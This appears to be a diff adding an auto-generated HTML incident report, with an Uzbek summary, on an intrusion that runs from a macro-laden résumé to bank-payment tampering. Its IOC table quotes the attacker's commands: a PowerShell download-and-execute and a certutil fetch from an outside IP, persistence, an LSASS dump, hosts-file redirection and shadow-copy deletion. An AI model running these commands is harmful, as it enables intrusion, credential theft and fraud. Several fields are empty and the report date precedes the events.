@@ -1,0 +1,118 @@
+<!DOCTYPE html><html><head><meta charset='utf-8'><title>Incident Report</title><style>
+    body { font-family: Arial, sans-serif; margin: 40px auto; max-width: 900px; line-height: 1.6; color: #333; }
+    h1, h2, h3 { color: #2c3e50; }
+    table { border-collapse: collapse; width: 100%; margin-bottom: 20px; }
+    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+    th { background-color: #f2f2f2; }
+    .meta { background: #f9f9f9; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
+    .warning { color: #d35400; font-weight: bold; }
+    @media print { body { margin: 0; } }
+    </style></head><body>
+<h1>Incident Report: Incident Report</h1>
+<div class='meta'>
+<b>Organization:</b>  | 
+<b>Date:</b> 2026-09-18 | 
+<b>Team:</b>  | 
+<b>Analyst:</b> 
+</div>
+<h2>Executive Summary</h2>
+<p>Tergov 33 hodisa, 4 host, 32 ATT&amp;CK texnikasi aniqladi. Boshlang&#x27;ich kirish: T1566.001. Ta&#x27;sir: T1490, T1565.001, T1657. 17 IOC ajratildi. 0 remediation amali bajarildi.</p>
+<p class='warning'>Davriy trafik (checker/SLA) aniqlandi — remediation&#x27;da tegilmadi</p>
+<h2>ATT&amp;CK Techniques</h2>
+<table><tr>
+<th>ID</th><th>Name</th><th>Tactic</th><th>Count</th><th>Evidence</th>
+</tr>
+<tr><td>T1566.001</td><td>Spearphishing Attachment</td><td>initial-access</td><td>1</td><td></td></tr>
+<tr><td>T1053.005</td><td>Scheduled Task</td><td>execution</td><td>2</td><td></td></tr>
+<tr><td>T1059</td><td>Command and Scripting Interpreter</td><td>execution</td><td>1</td><td></td></tr>
+<tr><td>T1059.001</td><td>PowerShell</td><td>execution</td><td>4</td><td></td></tr>
+<tr><td>T1059.003</td><td>Windows Command Shell</td><td>execution</td><td>1</td><td></td></tr>
+<tr><td>T1059.005</td><td>Visual Basic</td><td>execution</td><td>1</td><td></td></tr>
+<tr><td>T1204.002</td><td>Malicious File</td><td>execution</td><td>1</td><td></td></tr>
+<tr><td>T1569.002</td><td>Service Execution</td><td>execution</td><td>1</td><td></td></tr>
+<tr><td>T1098</td><td>Account Manipulation</td><td>persistence</td><td>1</td><td></td></tr>
+<tr><td>T1543.003</td><td>Windows Service</td><td>persistence</td><td>1</td><td></td></tr>
+<tr><td>T1547.001</td><td>Registry Run Keys / Startup Folder</td><td>persistence</td><td>1</td><td></td></tr>
+<tr><td>T1027</td><td>Obfuscated Files or Information</td><td>stealth</td><td>1</td><td></td></tr>
+<tr><td>T1078</td><td>Valid Accounts</td><td>stealth</td><td>2</td><td></td></tr>
+<tr><td>T1218</td><td>System Binary Proxy Execution</td><td>stealth</td><td>3</td><td></td></tr>
+<tr><td>T1218.011</td><td>Rundll32</td><td>stealth</td><td>1</td><td></td></tr>
+<tr><td>T1574.001</td><td>DLL</td><td>stealth</td><td>1</td><td></td></tr>
+<tr><td>T1003.001</td><td>LSASS Memory</td><td>credential-access</td><td>1</td><td></td></tr>
+<tr><td>T1110</td><td>Brute Force</td><td>credential-access</td><td>1</td><td></td></tr>
+<tr><td>T1112</td><td>Modify Registry</td><td>defense-impairment</td><td>3</td><td></td></tr>
+<tr><td>T1552.001</td><td>Credentials In Files</td><td>credential-access</td><td>2</td><td></td></tr>
+<tr><td>T1685</td><td>Disable or Modify Tools</td><td>defense-impairment</td><td>3</td><td></td></tr>
+<tr><td>T1685.005</td><td>Clear Windows Event Logs</td><td>defense-impairment</td><td>1</td><td></td></tr>
+<tr><td>T1018</td><td>Remote System Discovery</td><td>discovery</td><td>1</td><td></td></tr>
+<tr><td>T1069.002</td><td>Domain Groups</td><td>discovery</td><td>1</td><td></td></tr>
+<tr><td>T1087.002</td><td>Domain Account</td><td>discovery</td><td>1</td><td></td></tr>
+<tr><td>T1135</td><td>Network Share Discovery</td><td>discovery</td><td>1</td><td></td></tr>
+<tr><td>T1021.001</td><td>Remote Desktop Protocol</td><td>lateral-movement</td><td>2</td><td></td></tr>
+<tr><td>T1105</td><td>Ingress Tool Transfer</td><td>command-and-control</td><td>3</td><td></td></tr>
+<tr><td>T1219</td><td>Remote Access Tools</td><td>command-and-control</td><td>1</td><td></td></tr>
+<tr><td>T1490</td><td>Inhibit System Recovery</td><td>impact</td><td>1</td><td></td></tr>
+<tr><td>T1565.001</td><td>Stored Data Manipulation</td><td>impact</td><td>2</td><td></td></tr>
+<tr><td>T1657</td><td>Financial Theft</td><td>impact</td><td>1</td><td></td></tr>
+</table>
+<h2>Indicators of Compromise (IOC)</h2>
+<table><tr>
+<th>Type</th><th>Value</th><th>Count</th><th>First</th><th>Last</th>
+</tr>
+<tr><td>ip</td><td>172.16.9.9</td><td>5</td><td>2026-10-05T08:59:00</td><td>2026-10-05T09:19:00</td></tr>
+<tr><td>ip</td><td>10.10.20.60</td><td>5</td><td>2026-10-05T08:59:00</td><td>2026-10-05T09:19:00</td></tr>
+<tr><td>unix_path</td><td>GET /health</td><td>5</td><td>2026-10-05T08:59:00</td><td>2026-10-05T09:19:00</td></tr>
+<tr><td>win_path</td><td>C:\Program Files\Microsoft Office\WINWORD.EXE /n rezyume.docm</td><td>1</td><td>2026-10-05T09:01:12</td><td>2026-10-05T09:01:12</td></tr>
+<tr><td>unix_path</td><td>IEX (New-Object Net.WebClient).DownloadString(&#x27;http://45.142.212.61/a.ps1&#x27;)</td><td>1</td><td>2026-10-05T09:01:59</td><td>2026-10-05T09:01:59</td></tr>
+<tr><td>unix_path</td><td>certutil.exe -urlcache -split -f http://45.142.212.61/beacon.exe C:\Users\hr.olim\AppData\Local\Temp\beacon.exe</td><td>1</td><td>2026-10-05T09:02:20</td><td>2026-10-05T09:02:20</td></tr>
+<tr><td>ip</td><td>10.10.20.51</td><td>13</td><td>2026-10-05T09:02:35</td><td>2026-10-05T09:23:00</td></tr>
+<tr><td>ip</td><td>45.142.212.61</td><td>5</td><td>2026-10-05T09:02:35</td><td>2026-10-05T09:20:00</td></tr>
+<tr><td>unix_path</td><td>schtasks /create /sc onlogon /tn Updater /tr C:\Users\hr.olim\AppData\Local\Temp\beacon.exe</td><td>1</td><td>2026-10-05T09:07:10</td><td>2026-10-05T09:07:10</td></tr>
+<tr><td>unix_path</td><td>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\hr.olim\AppData\Local\Temp\beacon.exe /f</td><td>1</td><td>2026-10-05T09:07:40</td><td>2026-10-05T09:07:40</td></tr>
+<tr><td>unix_path</td><td>net view /domain</td><td>1</td><td>2026-10-05T09:12:03</td><td>2026-10-05T09:12:03</td></tr>
+<tr><td>unix_path</td><td>nltest /dclist:corp.local</td><td>1</td><td>2026-10-05T09:12:20</td><td>2026-10-05T09:12:20</td></tr>
+<tr><td>unix_path</td><td>net group &quot;Domain Admins&quot; /domain</td><td>1</td><td>2026-10-05T09:12:41</td><td>2026-10-05T09:12:41</td></tr>
+<tr><td>win_path</td><td>C:\Windows\System32\rundll32.exe comsvcs.dll, MiniDump 720 C:\Windows\Temp\lsass.dmp full</td><td>1</td><td>2026-10-05T09:14:05</td><td>2026-10-05T09:14:05</td></tr>
+<tr><td>unix_path</td><td>cmd.exe /c echo 91.238.50.10 ibank.example.uz &gt;&gt; C:\Windows\System32\drivers\etc\hosts</td><td>1</td><td>2026-10-05T09:28:40</td><td>2026-10-05T09:28:40</td></tr>
+<tr><td>unix_path</td><td>1cv8.exe ENTERPRISE /N buxgalter kl_to_1c.txt payment_order edited</td><td>1</td><td>2026-10-05T09:31:02</td><td>2026-10-05T09:31:02</td></tr>
+<tr><td>unix_path</td><td>vssadmin delete shadows /all /quiet</td><td>1</td><td>2026-10-05T09:35:50</td><td>2026-10-05T09:35:50</td></tr>
+</table>
+<h2>Timeline</h2>
+<table><tr>
+<th>Time</th><th>Host</th><th>User</th><th>ATT&CK</th><th>Command</th>
+</tr>
+<tr><td>2026-10-05T08:59:00</td><td>GW-CHECK</td><td>checker</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:01:12</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:01:44</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:01:59</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:02:20</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:02:35</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:04:00</td><td>GW-CHECK</td><td>checker</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:05:00</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:07:10</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:07:40</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:09:00</td><td>GW-CHECK</td><td>checker</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:10:00</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:12:03</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:12:20</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:12:41</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:14:00</td><td>GW-CHECK</td><td>checker</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:14:05</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:15:00</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:19:00</td><td>GW-CHECK</td><td>checker</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:20:00</td><td>HR-PC01</td><td>hr.olim</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:20:11</td><td>DC01</td><td>SYSTEM</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:20:22</td><td>DC01</td><td>SYSTEM</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:20:33</td><td>DC01</td><td>SYSTEM</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:20:44</td><td>DC01</td><td>SYSTEM</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:20:55</td><td>DC01</td><td>SYSTEM</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:21:06</td><td>DC01</td><td>SYSTEM</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:21:30</td><td>DC01</td><td>SYSTEM</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:23:00</td><td>BUX-PC05</td><td>bux.aziza</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:25:14</td><td>BUX-PC05</td><td>bux.aziza</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:28:40</td><td>BUX-PC05</td><td>bux.aziza</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:31:02</td><td>BUX-PC05</td><td>bux.aziza</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:35:50</td><td>BUX-PC05</td><td>bux.aziza</td><td></td><td></td></tr>
+<tr><td>2026-10-05T09:36:20</td><td>BUX-PC05</td><td>bux.aziza</td><td></td><td></td></tr>
+</table>
+</body></html>
